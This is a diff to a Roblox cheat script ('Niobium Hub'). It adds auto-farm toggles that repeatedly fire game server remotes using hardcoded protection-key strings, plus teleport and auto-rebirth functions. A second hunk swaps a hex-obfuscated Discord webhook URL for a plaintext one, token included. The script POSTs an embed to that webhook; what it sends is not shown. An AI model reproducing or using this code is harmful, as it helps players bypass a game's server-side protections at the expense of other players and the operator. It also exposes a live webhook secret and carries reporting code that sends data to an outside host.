@@ -585,7 +585,168 @@ game:GetService("ReplicatedStorage").Saisei:FireServer(unpack(args))
 			}) 
 		end
 
-
+		if game.PlaceId == 1498793919 then
+			_G.soquinhomist = false
+			_G.kimist = false
+			_G.spirit = false
+			_G.defensemist = false
+			_G.autoreb = false
+			local Window = Rayfield:CreateWindow({
+				Name = "Niobiumm Hub | "..GameName,
+				LoadingTitle = "Niobium Hub",
+				LoadingSubtitle = "Loading "..GameName,
+				ConfigurationSaving = {
+					Enabled = false,
+					FolderName = nil, -- Create a custom folder for your hub/game
+					FileName = "Big Hub"
+				},
+					Discord = {
+						Enabled = true,
+						Invite = "huJUBjhq7e", -- The Discord invite code, do not include discord.gg/
+						RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+					},
+				KeySystem = false, -- Set this to true to use our key system
+				KeySettings = {
+					Title = "Sirius Hub",
+					Subtitle = "Key System",
+					Note = "Join the discord (discord.gg/sirius)",
+					FileName = "SiriusKey",
+					SaveKey = true,
+					GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+					Key = "Hello"
+				}
+			})
+			local Tab = Window:CreateTab("Main", 10058434487) -- Title, Image
+			local Section = Tab:CreateSection("Training")
+			local Toggle = Tab:CreateToggle({
+				Name = "Attack",
+				CurrentValue = false,
+				Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+				Callback = function(Value)
+					_G.soquinhomist = Value
+					while _G.soquinhomist == true do
+		local args = {
+			[1] = "1412qRsx0Pr%tect!on1412"
+		}
+		
+		game:GetService("ReplicatedStorage").Punch:FireServer(unpack(args))
+		
+					
+				task.wait()
+		
+			end
+			end,
+		})
+		local Toggle = Tab:CreateToggle({
+			Name = "Spirit",
+			CurrentValue = false,
+			Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+			Callback = function(Value)
+				_G.spirit = Value
+				while _G.spirit == true do
+					game:GetService("ReplicatedStorage").SpiritXp:FireServer()
+			task.wait()
+		
+		end
+		end,
+		})
+		local Toggle = Tab:CreateToggle({
+		Name = "Defense",
+		CurrentValue = false,
+		Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+		Callback = function(Value)
+			_G.defensemist = Value
+			while _G.defensemist == true do
+		local args = {
+			[1] = "1412qRsx0Pr%tect!on1412"
+		}
+		game:GetService("ReplicatedStorage").Defense:FireServer(unpack(args))
+		task.wait()
+		end
+		end,
+		})
+		local Toggle = Tab:CreateToggle({
+			Name = "Ki",
+			CurrentValue = false,
+			Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+			Callback = function(Value)
+				_G.kimist = Value
+				while _G.kimist == true do
+		local args = {
+			[1] = "1412qRsx0Pr%tect!on1412",
+			[2] = 50,
+			[3] = CFrame.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000)) * CFrame.Angles(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000)),
+			[4] = Vector3.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000)),
+			[5] = Vector3.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000))
+		}
+		game:GetService("ReplicatedStorage").KiBlast:FireServer(unpack(args))
+			task.wait()
+			end
+			end,
+			})
+			function safeplace()
+				local Bs = Instance.new("Part")
+				Bs.Name = "SafePart"
+				Bs.Parent = workspace
+				Bs.Size = Vector3.new(500,5,500)
+				Bs.Anchored = true
+				Bs.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(1500,2000),math.random(3000,3500),math.random(1500,2000))
+				task.wait(1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Bs.CFrame + Vector3.new(0,10,0)
+		
+			end
+			
+			function tomap()
+				game.Players.LocalPlayer.Character:BreakJoints()
+			end
+			local Toggle = Tab:CreateToggle({
+				Name = "Auto Reb",
+				CurrentValue = false,
+				Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+				Callback = function(Value)
+					_G.autoreb = Value
+					while _G.autoreb == true do
+						local SafePart = workspace:FindFirstChild("SafePart")
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = SafePart.CFrame + Vector3.new(0,10,0)
+						local args = {
+			[1] = "*1614qv^pRsx0Pr%tEct!on1614*"
+		}
+		game:GetService("ReplicatedStorage").Saisei:FireServer(unpack(args))
+		
+				task.wait()
+				end
+				end,
+				})
+				function safeplace()
+					local Bs = Instance.new("Part")
+					Bs.Name = "SafePart"
+					Bs.Parent = workspace
+					Bs.Size = Vector3.new(500,5,500)
+					Bs.Anchored = true
+					Bs.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(1500,2000),math.random(3000,3500),math.random(1500,2000))
+					task.wait(1)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Bs.CFrame + Vector3.new(0,10,0)
+		
+				end
+				
+				function tomap()
+					game.Players.LocalPlayer.Character:BreakJoints()
+				end
+				local Paragraph = Tab:CreateParagraph({Title = "Important", Content = "Use safe place then enable auto reb"})
+				local Section = Tab:CreateSection("Safe Place")
+				local Button = Tab:CreateButton({
+						Name = "Safe Place",
+						Callback = function()
+							safeplace()
+						end
+					})
+					local Button = Tab:CreateButton({
+						Name = "Back To Map",
+						Callback = function()
+							tomap()
+						end,
+					}) 
+				end
 
 
 
@@ -622,27 +783,10 @@ local Embed = {
 			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = '68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313036303335383433333433353536323038352f69705466525f624c455a575559464964496e6a6f54575a7648735f44556f354e54357a6b70523879416c3661644e3245385f784f3755624a58664d4e2d4f494c6f426c68';
+    Url = 'https://discord.com/api/webhooks/1068712581671419904/A-9BzGWE6FhxdG_yFTvncijuzMFuHEJ_VpcT-YlKhA_Ttu1DvXeE97iD0HblS96CWkfg';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
     };
     Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
 };
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
